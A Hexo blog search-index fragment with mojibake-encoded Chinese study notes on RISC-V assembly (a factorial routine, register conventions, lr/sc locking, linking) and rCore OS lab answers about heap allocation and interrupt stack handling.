class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FACT:</span><br><span class="line">  addi sp,sp,-16   &#x2F;&#x2F;adjust stack for 2 items</span><br><span class="line">      sd   x1,8(sp)    &#x2F;&#x2F;save the return address</span><br><span class="line">      sd   x10,0(sp)   &#x2F;&#x2F;save the argument n</span><br><span class="line"></span><br><span class="line">      addi x5,x10,-1   &#x2F;&#x2F;x5&#x3D;n-1</span><br><span class="line">      bge  x5,x0,L1    &#x2F;&#x2F;if(n-1)&gt;&#x3D;0,go to L1</span><br><span class="line"></span><br><span class="line">      addi x10,x0,1    &#x2F;&#x2F;return 1</span><br><span class="line">      addi sp,sp,16    &#x2F;&#x2F;pop 2 items off stack</span><br><span class="line">      jalr x0,0(x1)    &#x2F;&#x2F;return to caller</span><br><span class="line"></span><br><span class="line">L1: </span><br><span class="line">  addi x10,x10,-1  &#x2F;&#x2F;n&gt;&#x3D;1: argument gets(n-1)</span><br><span class="line">      jal  x1,FACT     &#x2F;&#x2F;call fact with(n-1)</span><br><span class="line"></span><br><span class="line">      addi x6,x10,0    &#x2F;&#x2F;return from jal:move result of fact(n-1) to x6</span><br><span class="line">      ld   x10,0(sp)   &#x2F;&#x2F;restore argument n</span><br><span class="line">      ld   x1,8(sp)    &#x2F;&#x2F;restore the return address</span><br><span class="line">      addi sp,sp,16    &#x2F;&#x2F;adjust stack point to pop 2 items</span><br><span class="line"></span><br><span class="line">      mul  x10,x10,x6  &#x2F;&#x2F;return n*fact(n-1)</span><br><span class="line">      jalr x0,0(x1)    &#x2F;&#x2F;return to the caller </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>â€‹     æ³¨æ„jalã€jalrï¼Œld ç­‰æŒ‡ä»¤æŒ‡æŒ¥è¿™æŒ‡ä»¤è·³æ¥è·³å»ï¼Œå¹¶ä¸”å°†stackçš„å‚æ•°ä¸€æ­¥æ­¥çš„æ¨å‡ºï¼›</p><p>Cè¯­è¨€å˜é‡å¯ä»¥æŒ‰ç…§2ç±»åˆ†ï¼š</p><ul><li>ç±»å‹<ul><li>æ•°å­—</li><li>å­—ç¬¦</li></ul></li><li>ç”Ÿå‘½å‘¨æœŸ<ul><li>automatic</li><li>static</li></ul></li></ul><p>automaticå¯¹äºä¸€ä¸ªè¿‡ç¨‹è€Œè¨€æ˜¯æœ¬åœ°çš„ï¼Œç¨‹åºè°ƒç”¨å®Œæˆåè‡ªåŠ¨æ¶ˆå¤±ï¼›</p><p>staticåˆ™è´¯ç©¿å§‹ç»ˆï¼›ä¸€èˆ¬ç”¨staticæ ‡è¯†å£°æ˜ï¼›</p><h4 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h4><table><thead><tr><th>Preserved</th><th>Not Preserved</th></tr></thead><tbody><tr><td>saved registersï¼šx8-x9,x18-x19</td><td>Temprary registers:x5-x7,x28-x31</td></tr><tr><td>Stack pointer register:x2(sp)</td><td>Argument/result register:x10-x17</td></tr><tr><td>Frame pointer:x8(fp)</td><td></td></tr><tr><td>Return address:x1(ra)</td><td></td></tr><tr><td>Stack above the stack pointer</td><td>Stack below the stack pointer</td></tr></tbody></table><p><strong>åœ¨æ ˆä¸Šä¸ºæ–°æ•°æ®ç”³è¯·ç©ºé—´</strong></p><p> <strong>Stack</strong>è¢«ç§°ä¸ºæ ˆï¼Œå­˜å‚¨ç¨‹åºè°ƒç”¨çš„automaticå‹çš„æœ¬åœ°å˜é‡ï¼›</p><blockquote><p> The segment of the stack containing a procdureâ€™s saved registers and local variables is called a <strong>procedure frame</strong> or <strong>activation record</strong>.</p></blockquote><p>ä¸€äº›RISC-Vç¼–è¯‘å™¨ä½¿ç”¨<code>FPï¼ˆframe pointerï¼‰</code>æŒ‡å‘æ ˆçš„æ”¶ä½å€¼ã€‚ä½¿ç”¨FPçš„å¥½å¤„æ˜¯å¯ä»¥å¾ˆæ–¹é¢çš„å®šä½local parameterçš„ä½ç½®ï¼Œæ–¹ä¾¿è°ƒè¯•ä¸å®šä½ï¼›</p><p>Stackä¸€èˆ¬æ˜¯ä»é«˜åœ°å€å¾€ä½åœ°å€é€’å‡çš„ï¼›</p><p><strong>åœ¨å †ä¸Šä¸ºæ–°æ•°æ®ç”³è¯·ç©ºé—´</strong></p><p> <strong>Heap</strong>è¢«ç§°ä¸ºå †ï¼Œå­˜å‚¨ç¨‹åºè°ƒç”¨çš„staticå‹å˜é‡ï¼›</p><ul><li> Heapæ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€å¢åŠ çš„ï¼›</li><li>å †çš„ç¬¬ä¸€ä¸ªåœ°å€æ˜¯ä¿ç•™çš„reservedï¼Œæ¥ç€æ˜¯<strong>text segement</strong>ï¼ˆthe home of the RISC-V machine codeï¼‰ï¼Œå†å¾€ä¸Šå°±æ˜¯static data segment</li></ul><blockquote><p> Cè¯­è¨€ä¸­ç”¨mallocç”¨freeæ¥åˆ†é…å’Œé‡Šæ”¾heapç©ºé—´ï¼›<br> Cè¯­è¨€è¿™ç§æ‰‹åŠ¨åˆ†é…å’Œé‡Šæ”¾ç©ºé—´çš„æœºåˆ¶å¸¦æ¥äº†å¾ˆå¤šbugï¼Œç›¸æ¯”JAVAåˆ™ä¸ä¼šï¼›</p></blockquote><p>æœ€åç”¨ä¸€ä¸ªè¡¨æ ¼æ¥è¯´æ˜RISC-Vå¯„å­˜å™¨çš„çº¦å®šï¼š</p><table><thead><tr><th>Name</th><th>Register number</th><th>Usage</th><th>Presrved on call</th></tr></thead><tbody><tr><td>x0</td><td>0</td><td>The constant value 0</td><td>n.a</td></tr><tr><td>x1(ra)</td><td>1</td><td>Return address(link register)</td><td>yes</td></tr><tr><td>x2(sp)</td><td>2</td><td>Stack pointer</td><td>yes</td></tr><tr><td>x3(gp)</td><td>3</td><td>Global pointer</td><td>yes</td></tr><tr><td>x4(tp)</td><td>4</td><td>Thread pointer</td><td>yes</td></tr><tr><td>x5-x7</td><td>5-7</td><td>Temporaries</td><td>no</td></tr><tr><td>x8-x9</td><td>8-9</td><td>Saved</td><td>yes</td></tr><tr><td>x10-x17</td><td>10-17</td><td>Arguments/results</td><td>no</td></tr><tr><td>x18-x27</td><td>18-27</td><td>Saved</td><td>yes</td></tr><tr><td>x28-x31</td><td>28-31</td><td>Temporaries</td><td>no</td></tr></tbody></table><h3 id="2-9-äººæœºäº¤äº’"><a href="#2-9-äººæœºäº¤äº’" class="headerlink" title="2.9 äººæœºäº¤äº’"></a>2.9 äººæœºäº¤äº’</h3><p>è®¡ç®—æœºå¦‚ä½•æ˜¾ç¤ºå‘¢ï¼Œé€šå¸¸ä½¿ç”¨8bitçš„ASCIIç ï¼›</p><p>ä¸ºäº†æ–¹ä¾¿å­—ç¬¦æ“ä½œï¼ŒRISC-Væä¾›äº†ä¸¤ä¸ªæ±‡ç¼–æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lbu x12,0(x10) # è¯»</span><br><span class="line">sb x12,0(x11)  # å†™</span><br></pre></td></tr></table></figure><p><code>lbu: </code>æ— ç¬¦å·åŠ è½½æ•°æ®,å°†å­—èŠ‚åŠ è½½åˆ°ç›®çš„å¯„å­˜å™¨çš„æœ€å³ç«¯ï¼›</p><p> <code>sb:</code>  ä¿å­˜å­—èŠ‚,å°†æœ€å³ä¾§çš„å­—èŠ‚å­˜å…¥å†…å­˜ï¼›</p><p><strong>stringæœ‰3ç§è¡¨ç¤ºæ–¹å¼ï¼š</strong></p><ol><li>stringç¬¬ä¸€ä¸ªåœ°å€ä¿ç•™ï¼Œç»™å‡ºstringé•¿åº¦ï¼›- JAVA</li><li>ç”¨ä¸€ä¸ªä¼´éšå˜é‡æ¥è¡¨ç¤ºstringé•¿åº¦ï¼›</li><li>æœ€åç”¨ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦è¡¨ç¤ºstringç»“æŸï¼› - C</li></ol><p>RISC-Véœ€è¦ä½¿ç”¨load/store åŠä¸ªæœºå™¨å­—æŒ‡ä»¤æ¥loadå’Œstoreä¸€ä¸ªå­—ç¬¦ï¼›</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lhu x19,0(x10) &#x2F;&#x2F;Read halfword from source</span><br><span class="line">sh  x10,0(x11)  &#x2F;&#x2F;Write halfword to destination</span><br></pre></td></tr></table></figure><h3 id="2-10-RISC-V-å¯¹äºå¤§ç«‹å³æ•°å’Œ-åœ°å€-çš„å¤„ç†æ–¹æ³•"><a href="#2-10-RISC-V-å¯¹äºå¤§ç«‹å³æ•°å’Œ-åœ°å€-çš„å¤„ç†æ–¹æ³•" class="headerlink" title="2.10 RISC-V å¯¹äºå¤§ç«‹å³æ•°å’Œ åœ°å€ çš„å¤„ç†æ–¹æ³•"></a>2.10 RISC-V å¯¹äºå¤§ç«‹å³æ•°å’Œ åœ°å€ çš„å¤„ç†æ–¹æ³•</h3><h3 id="2-11-å¹¶è¡Œ-å’Œ-æŒ‡ä»¤-ï¼š-åŒæ­¥"><a href="#2-11-å¹¶è¡Œ-å’Œ-æŒ‡ä»¤-ï¼š-åŒæ­¥" class="headerlink" title="2.11 å¹¶è¡Œ å’Œ æŒ‡ä»¤ ï¼š åŒæ­¥"></a>2.11 å¹¶è¡Œ å’Œ æŒ‡ä»¤ ï¼š åŒæ­¥</h3><p>æ•°æ®ç«äº‰ ï¼š ä¸¤ä¸ªç¨‹åº è®¿é—®åŒä¸€ä¸ªæ•°æ®ï¼Œä¸€ä¸ªæœªå†™å®Œï¼Œä¸€ä¸ªå·²ç»å¼€å§‹è¯»</p><blockquote><p>åŒæ­¥æœºåˆ¶é€šå¸¸æ˜¯ç”±ç”¨æˆ·çº§è½¯ä»¶ä¾‹ç¨‹æ„å»ºçš„ï¼Œè¿™äº›ä¾‹ç¨‹ä¾èµ–äºç¡¬ä»¶æä¾›çš„åŒæ­¥æŒ‡ä»¤</p><p>è½¯ä»¶ä¹‹é—´é€šè¿‡ç¡¬ä»¶æä¾›çš„åŒæ­¥æŒ‡ä»¤æ¥æ„é€ åŒæ­¥æœºåˆ¶ï¼Œ</p><p>æˆ‘ä»¬ä¸“æ³¨äº åŒæ­¥ä¸­ çš„ lock unlock ï¼Œè¿™å¯¹äºå•å¤„ç†å™¨å¾ˆå®¹æ˜“æ‰§è¡Œ</p></blockquote><p>æˆ‘ä»¬åœ¨å¤šå¤„ç†å™¨ä¸­å®ç°åŒæ­¥æ‰€éœ€è¦çš„å…³é”®èƒ½åŠ›æ˜¯ä¸€ç»„å…·æœ‰è‡ªåŠ¨è¯»å–å’Œä¿®æ”¹å†…å­˜ä½ç½®èƒ½åŠ›çš„ç¡¬ä»¶åŸè¯­;</p><p>ä»¥atomic exchange/atomic swapä¸ºä¾‹ï¼Œå®ƒä¸»è¦å®Œæˆä¸¤ä¸ªå­˜å‚¨ä¹‹é—´çš„æ•°å€¼äº¤æ¢ï¼›</p><p> Lock = <strong>0</strong>è¡¨ç¤ºunlockï¼ŒLock = <strong>1</strong>åˆ™è¡¨ç¤ºlockï¼›</p><p> ä»è€Œå¼•å‡ºlr.d(è¯»å–åŒä¿ç•™å­—)å’Œsc.d(å­˜å‚¨æœ‰æ¡ä»¶çš„åŒå­—)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        addi x12,x0,1       &#x2F;&#x2F;copy locked value</span><br><span class="line">again:  lr.d x10,(x20)      &#x2F;&#x2F;load-reserved to read lock</span><br><span class="line">        bne  x10,x0,again   &#x2F;&#x2F;check if it is 0 yet</span><br><span class="line">        sc.d x11,x12,(x20)  &#x2F;&#x2F;attempt to store new value</span><br><span class="line">        bne  x11,x0,again   &#x2F;&#x2F;branch if store fails</span><br><span class="line"></span><br><span class="line">        sd x0,0(x20)        &#x2F;&#x2F;free lock by writing 0</span><br></pre></td></tr></table></figure><h3 id="2-12-ç¼–è¯‘-å’Œ-è¿æ¥-ç¨‹åº"><a href="#2-12-ç¼–è¯‘-å’Œ-è¿æ¥-ç¨‹åº" class="headerlink" title="2.12 ç¼–è¯‘ å’Œ  è¿æ¥ ç¨‹åº"></a>2.12 ç¼–è¯‘ å’Œ  è¿æ¥ ç¨‹åº</h3><p>æœ¬èŠ‚ä¸»è¦è®²ä»ç£ç›˜ä¸€æ®µCè¯­è¨€æ–‡ä»¶åˆ°è®¡ç®—æœºå¯ä»¥æ‰§è¡Œçš„ç¨‹åºä¹‹é—´çš„4ä¸ªæ­¥éª¤ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/18610675-031b6a1271e0666f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/928/format/webp" alt="img"></p><p><strong>Compiler</strong></p><p>Compilerå°†é«˜çº§è¯­è¨€ç¼–è¯‘ä¸ºé€šç”¨çš„æ±‡ç¼–ï¼ˆé€šç”¨çš„æ±‡ç¼–æ˜¯å› ä¸ºæ²¡æœ‰ç›®çš„å™¨ä»¶ï¼‰</p><p><strong>Assembler</strong></p><p>Assemblerå°±æ˜¯å™¨ä»¶å¯¹åº”çš„ç¼–è¯‘å™¨ï¼Œå°†é€šç”¨æ±‡ç¼–ç¼–è¯‘æˆå¯¹åº”å™¨ä»¶æ”¯æŒçš„æ±‡ç¼–ï¼›</p><p><strong>Linker</strong></p><p>é“¾æ¥å™¨ï¼Œå°†æºæ–‡ä»¶å’Œ åº“æ–‡ä»¶ï¼Œè¿›è¡Œé“¾æ¥</p><p><strong>å¦‚ä½•åšåˆ°ä¿®æ”¹äº†ä¸€è¡Œä»£ç è€Œä¸ç”¨é‡æ–°å¼€å§‹ç¼–è¯‘ï¼›</strong></p><p><strong>Dynamically Linked Libraries</strong></p><p> ä¼ ç»Ÿçš„link librariesçš„æ–¹æ³•æ˜¯staticæ–¹æ³•ï¼Œæœ‰ä¸€äº›ç¼ºç‚¹ï¼š</p><ul><li>The library routines become part of the executable code.æœ¨å·²æˆèˆŸï¼Œå†éš¾ä¿®æ”¹ï¼›</li><li>æ‰€æœ‰çš„routineséƒ½è¦è¢«loadï¼Œç®¡ä½ è¦ä¸è¦ï¼›</li></ul><p>è¿™äº›ç¼ºç‚¹å¯¼è‡´äº†DLL(Dynamically linked libraries)çš„å‡ºç°ï¼›</p><p>DLL,where the library routines are not linked an loaded until the program is run</p><p> <strong>Starting a JAVA Program</strong></p><p> åˆæ­¥è®¤è¯†ä¸€äº›JVMå’ŒJITå§</p><p><img src="https://upload-images.jianshu.io/upload_images/18610675-cbac66de1d7fe674.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/535/format/webp" alt="img"></p><p>å„ä¸ªå¹³å°æœ‰ä¸åŒçš„JVMï¼Œå¦‚windows JVMï¼ŒUNIX JVMç­‰ï¼Œåˆ†åˆ«è´Ÿè´£å°†JVMè™šæ‹Ÿæœºæœ€ç»ˆè§£</p><p>Windowså’ŒUnix instructionï¼›</p>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®éªŒäºŒæ€»ç»“</title>
      <link href="/2020/07/19/%E5%AE%9E%E9%AA%8C%E4%BA%8C/"/>
      <url>/2020/07/19/%E5%AE%9E%E9%AA%8C%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>å®éªŒäºŒçš„åˆ†æåŠè§£ç­”</p><a id="more"></a><h1 id="å®éªŒäºŒ"><a href="#å®éªŒäºŒ" class="headerlink" title="å®éªŒäºŒ"></a>å®éªŒäºŒ</h1><ol><li>åŸç†ï¼š.bss å­—æ®µæ˜¯ä»€ä¹ˆå«ä¹‰ï¼Ÿä¸ºä»€ä¹ˆæˆ‘ä»¬è¦å°†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆå †ï¼‰ç©ºé—´æ”¾åœ¨ .bss å­—æ®µï¼Ÿ</li></ol><p>æ”¾ç½®åœ¨æ­¤å¤„åªæ˜¯ä¸å¾—ä»¥è€Œä¸ºä¹‹ï¼Œæˆ‘ä»¬åœ¨ç‰©ç†é¡µé¢åˆ†é…æ—¶éœ€è¦ä½¿ç”¨åˆ° Vecï¼Œå¯¹äºæ“ä½œç³»ç»Ÿå†…æ ¸æˆ‘ä»¬å…·æœ‰çš„å­—æ®µå°±é‚£ä¹ˆå‡ ä¸ªï¼Œä¸ºäº†è®©è¿™æ®µç©ºé—´åŒ…å«åœ¨å†…æ ¸çš„äºŒè¿›åˆ¶æ•°æ®ä¸­ï¼Œæ”¾åœ¨.bss ä¸­åˆ©ç”¨äº†å…¶å­˜æ”¾å…¨å±€å˜é‡ä¸ä¼šé”€æ¯çš„ç‰¹æ€§ã€‚</p><ol start="2"><li>åˆ†æï¼šæˆ‘ä»¬åœ¨åŠ¨æ€å†…å­˜åˆ†é…ä¸­å®ç°äº†ä¸€ä¸ªå †ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨å†…æ ¸ä»£ç ä¸­ä½¿ç”¨åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œä¾‹å¦‚ <code>Vec</code> <code>Box</code> ç­‰ã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬åœ¨å®ç°è¿™ä¸ªå †çš„è¿‡ç¨‹ä¸­ä½¿ç”¨ <code>Vec</code> è€Œä¸æ˜¯ <code>[u8]</code>ï¼Œä¼šå‡ºç°ä»€ä¹ˆç»“æœï¼Ÿ</li></ol><ul><li><p>vec éœ€è¦å †åˆ†é…å™¨ä¸ºå…¶åˆ†é…ç©ºé—´</p></li><li><p>å †åˆ†é…å™¨ éœ€è¦åˆ©ç”¨ vec è¿›è¡Œåˆ†é…</p></li></ul><p>ä¼šé€ æˆäº’ç›¸ä¾èµ–ï¼Œäº’ç›¸è°ƒç”¨çš„æ­»é”ã€‚</p><p>å®éªŒ</p><ol><li><p>å›ç­”ï¼š<code>algorithm/src/allocator</code> ä¸‹æœ‰ä¸€ä¸ª <code>Allocator</code> traitï¼Œæˆ‘ä»¬ä¹‹å‰ç”¨å®ƒå®ç°äº†ç‰©ç†é¡µé¢åˆ†é…ã€‚è¿™ä¸ªç®—æ³•çš„æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>stacked_Allocator çš„æ—¶é—´å¤æ‚åº¦ O(1) ç©ºé—´å¤æ‚åº¦ O(n)</p><p>segment_tree_allocator  çš„æ—¶é—´å¤æ‚åº¦ O(n) ï¼Œ ç©ºé—´å¤æ‚ O(n)</p></li><li><p>äºŒé€‰ä¸€ï¼šå®ç°åŸºäºçº¿æ®µæ ‘çš„ç‰©ç†é¡µé¢åˆ†é…ç®—æ³•ï¼ˆä¸éœ€è¦è€ƒè™‘åˆå¹¶åˆ†é…ï¼‰ï¼›æˆ–å°è¯•ä¿®æ”¹ <code>FrameAllocator</code>ï¼Œä»¤å…¶ä½¿ç”¨æœªè¢«åˆ†é…çš„é¡µé¢ç©ºé—´ï¼ˆè€Œä¸æ˜¯å…¨å±€å˜é‡ï¼‰æ¥å­˜æ”¾é¡µé¢ä½¿ç”¨çŠ¶æ€ã€‚</p><p>å€ŸåŠ©ç»™å‡ºçš„ä»£ç å’Œè‡ªå·±çš„ç†è§£å®ç°<a href="https://github.com/dingiso/DailySchedule/blob/master/code/%E5%AE%9E%E9%AA%8C%E4%BA%8C/segment_tree_allocator.rs">çº¿æ®µæ ‘</a></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
            <tag> risc-v </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®éªŒä¸€æ€»ç»“</title>
      <link href="/2020/07/12/%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
      <url>/2020/07/12/%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>å®éªŒä¸€çš„åˆ†æåŠè§£ç­”</p><a id="more"></a><h1 id="å®éªŒé¢˜-for-lab-1"><a href="#å®éªŒé¢˜-for-lab-1" class="headerlink" title="å®éªŒé¢˜ for lab-1"></a>å®éªŒé¢˜ for lab-1</h1><p>ä¸»è¦ä¿®æ”¹äº† <code>entry.asm</code> <code>main.rs</code> <code>handler.rs</code> å°†ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šæ¥</p><p><code>x0</code> å¯„å­˜å™¨ é»˜è®¤å­˜å‚¨<code>0x0</code> ï¼Œå¯ç›´æ¥æ— æ¡ä»¶è·³è½¬å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jr x0</span><br></pre></td></tr></table></figure><p>æˆ– ä½¿ä¸‹ä¸€æ¡è¿è¡Œçš„æŒ‡ä»¤ä¸º <code>0x0</code> ï¼Œé€šè¿‡æ”¹å˜<code>x1</code>å¯„å­˜å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld x1 ,(x0)</span><br></pre></td></tr></table></figure><p>handle_interrupt å‡½æ•°å¢åŠ å¤„ç†é¡¹ï¼Œå¤„ç†è®¿é—®é”™è¯¯åœ°å€çš„æƒ…å†µï¼Œå¦‚æœ <code>stval</code> å€¼ä¸º<strong>0</strong>åˆ™æ‰“å°<code>SUCCESSï¼</code></p><h3 id="ç®€è¿°é¢˜"><a href="#ç®€è¿°é¢˜" class="headerlink" title="ç®€è¿°é¢˜"></a>ç®€è¿°é¢˜</h3><p>1.åœ¨ <code>rust_main</code> å‡½æ•°ä¸­ï¼Œæ‰§è¡Œ <code>ebreak</code> å‘½ä»¤åè‡³å‡½æ•°ç»“æŸå‰ï¼Œ<code>sp</code> å¯„å­˜å™¨çš„å€¼æ˜¯æ€æ ·å˜åŒ–çš„?</p><p>å³åˆ†æ <code>interrupt.asm</code> .å¤„ç†ä¸­æ–­è¿‡ç¨‹ä¸­,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">addi sp,sp, -34*8 </span><br><span class="line"># å¯¹ sp å‡ æ ˆä¸Šå¼€è¾Ÿ Context æ‰€éœ€ç©ºé—´</span><br><span class="line"></span><br><span class="line">SAVE x1, 1</span><br><span class="line">addi x1, sp, 34*8</span><br><span class="line">SAVE x1, 2</span><br><span class="line"># å…ˆå­˜x1,å†åˆ©ç”¨x1å­˜æ”¾åŸæ¥spå€¼ , ä¸åŠ¨ç”¨ x2(sp) ä»¥æ­£ç¡®ä½¿ç”¨ SAVE å®</span><br><span class="line"></span><br><span class="line">mv a0 sp</span><br><span class="line"># å°† sp ä½œä¸ºå‚æ•°è°ƒç”¨ handle_interrupt</span><br><span class="line"></span><br><span class="line">LOAD    x2, 2</span><br><span class="line"># æœ€åå°† sp(x2) çš„å€¼æ¢å¤</span><br></pre></td></tr></table></figure><p>2.å›ç­”ï¼šå¦‚æœå»æ‰ <code>rust_main</code> åçš„ <code>panic</code> ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆï¼Ÿ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000080200000 text_start:</span><br><span class="line">80200000: 17 61 01 00                   auipc   sp, 22</span><br><span class="line">80200004: 13 01 01 59                   addi    sp, sp, 1424</span><br><span class="line">80200008: 97 10 00 00                   auipc   ra, 1</span><br><span class="line">8020000c: e7 80 a0 13                   jalr    314(ra)</span><br><span class="line"></span><br><span class="line">0000000080200014 _ZN4core3ptr24slice_from_raw_parts_mut17h5b8d4c2d17da80d3E:</span><br><span class="line">; pub const fn slice_from_raw_parts_mut&lt;T&gt;(data: *mut T, len: usize) -&gt; *mut [T] &#123;</span><br><span class="line">80200014: 79 71                         addi    sp, sp, -48</span><br><span class="line">80200016: 2a f0                         sd      a0, 32(sp)</span><br><span class="line">80200018: 2e f4                         sd      a1, 40(sp)</span><br><span class="line">;     unsafe &#123; Repr &#123; raw: FatPtr &#123; data, len &#125; &#125;.rust_mut &#125;</span><br><span class="line">8020001a: 2a e8                         sd      a0, 16(sp)</span><br><span class="line">8020001c: 2e ec                         sd      a1, 24(sp)</span><br><span class="line">8020001e: 2a e0                         sd      a0, 0(sp)</span><br><span class="line">80200020: 2e e4                         sd      a1, 8(sp)</span><br><span class="line">; &#125;</span><br><span class="line">80200022: 45 61                         addi    sp, sp, 48</span><br><span class="line">80200024: 82 80                         ret</span><br><span class="line"></span><br><span class="line">0000000080200026 _ZN4core3str11unwrap_or_017h6844c978da275184E:</span><br><span class="line">; fn unwrap_or_0(opt: Option&lt;&amp;u8&gt;) -&gt; u8 &#123;</span><br><span class="line">80200026: 41 11                         addi    sp, sp, -16</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° <code>rust_main</code>åè¿˜æœ‰è®¸å¤š<code>rust</code>åº“å‡½æ•°,å¯èƒ½ä¼šç›´æ¥ä»¥è¿è¡Œåº“å‡½æ•°é€ æˆä¸æ˜é”™è¯¯æˆ–æ­»å¾ªç¯</p><h3 id="ä»£ç -åœ¨-å®éªŒé¢˜1"><a href="#ä»£ç -åœ¨-å®éªŒé¢˜1" class="headerlink" title="ä»£ç  åœ¨ å®éªŒé¢˜1"></a>ä»£ç  åœ¨ <a href="https://github.com/dingiso/DailySchedule/tree/master/code/lab-1/%E5%AE%9E%E9%AA%8C%E9%A2%98">å®éªŒé¢˜1</a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> risc-v </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
